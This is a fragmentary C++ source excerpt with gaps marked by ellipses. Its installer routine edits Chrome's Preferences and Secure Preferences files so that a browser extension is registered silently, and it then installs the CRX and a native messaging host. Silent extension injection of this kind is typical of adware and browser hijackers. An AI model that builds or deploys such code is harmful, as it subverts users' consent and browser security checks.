...
//this function need fixed
bool CExtInstaller::SlientInstallExt(bool bForceInstall)
{
	if( false == GetChromeVersion(m_chromeVersion))
	{
		SHOW_LOG( _T("CExtInstaller::InstallExt  GetChromeVersion failed,maybe not installed chrome\n"));
		return false;
	}
	int majorVersion = GetChromeMajorVersion(m_chromeVersion);
	if (majorVersion < CHROME_SUPPORT_CRX_MINVER || majorVersion >CHROME_SUPPORT_LAST_VER )
		return false;
	if( false == GetChromeResPathByReg(m_chromeResPath, m_chromeVersion))
	{
		SHOW_LOG( _T("CExtInstaller::InstallExt  GetChromeResPathByReg failed,maybe not installed chrome\n"));
		return false;
	}
	
	tstring chromeSecPrefsPath = GetChromePreferencePath();
	bool bWriteSecPrefs = false;
#ifdef _TEST_CRX
	if( _T("") != chromeSecPrefsPath)
	{
		std::string fileData = GetFileData(chromeSecPrefsPath);
		Json::Reader reader;
		Json::Value root;

		if (reader.parse(fileData, root))
		{
			Json::Value readConfigData = root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE][CHROME_TEST_CRX_PATH];
			Json::FastWriter fw;
			std::string szConfig = fw.write(readConfigData);
			test2(szConfig);
		}
	}
#else
	...
	do{
		if( _T("") != chromeSecPrefsPath && PathFileExists(chromeSecPrefsPath.c_str()) )
		{
			std::string fileData = GetFileData(chromeSecPrefsPath);
			Json::Reader reader;
			Json::Value root;
			...
			if (reader.parse(fileData, root))
			{
				...
				if(chromeExtConfigReader.parse(chromeExtConfig,chromeExtConfigRoot))
				{
					...
					{	
						SHOW_LOG( _T("CExtInstaller::InstallExt not supported sec prefs\n"));
						break;
					}
					...
					if(bForceInstall || null_value == root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE][CHROME_SAMPLE_CRX_ID])
					{
						...
						out.close();
						bWriteSecPrefs = true;
						SHOW_LOG( _T("CExtInstaller::InstallExt sec prefs  write\n"));
					}
					break;
				...
				{
					SHOW_LOG( _T("CExtInstaller::InstallExt sec chromeExtConfig parse failed\n"));
				}
			}
			else
			{
				SHOW_LOG( _T("CExtInstaller::InstallExt sec fileData parse failed\n"));
			}
		}
		else
		{
			SHOW_LOG( _T("CExtInstaller::InstallExt sec chromeSecPrefsPath == _()\n"));
		}
	}while(0);

	bool bWritePrefs = false;
	...
	do{
		if( _T("") != chromePrefsPath && PathFileExists(chromePrefsPath.c_str()) )
		{
				...
				if( majorVersion >=CHROME_SUPPORT_SEC_MINVER )
				{
					...
					if(chromeExtConfigReader.parse(chromeExtConfig,chromeExtConfigRoot))
					{
						...
						if(bForceInstall || null_value == root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE][CHROME_SAMPLE_CRX_ID])
						{
							...
							Json::StyledWriter fw;
							std::string szOssOnConfig = fw.write(root);
							std::ofstream out(chromePrefsPath.c_str());
							out<<szOssOnConfig;
							out.close();
							bWritePrefs = true;
							SHOW_LOG( _T("CExtInstaller::InstallExt prefs  write\n"));
						}
						break;
					...
					{
						SHOW_LOG( _T("CExtInstaller::InstallExt 37-38 chromeExtConfig parse failed\n"));
					}
				}
				else if(majorVersion <CHROME_SUPPORT_SEC_MINVER)
				{
					...
					{
						SHOW_LOG( _T("CExtInstaller::InstallExt chromeExtConfig 33-36 parse failed\n"));
					}
			...
			{
				SHOW_LOG( _T("CExtInstaller::InstallExt fileData parse failed\n"));
			}
		}
		else
		{
			SHOW_LOG( _T("CExtInstaller::InstallExt chromeSecPrefsPath == _()\n"));
		}
	}while(0);
#endif

	if( !(bWriteSecPrefs || bWritePrefs) )
	{
		SHOW_LOG( _T("CExtInstaller::InstallExt not change prefs\n"));
		return false;
	}

	if( false == InstallCRX())
	{
		SHOW_LOG( _T("CExtInstaller::InstallExt  InstallCRX failed\n"));
		return false;
	}
	...
	{
		return false;
		SHOW_LOG( _T("CExtInstaller::InstallExt  RegisterNativeApp failed\n"));
	}
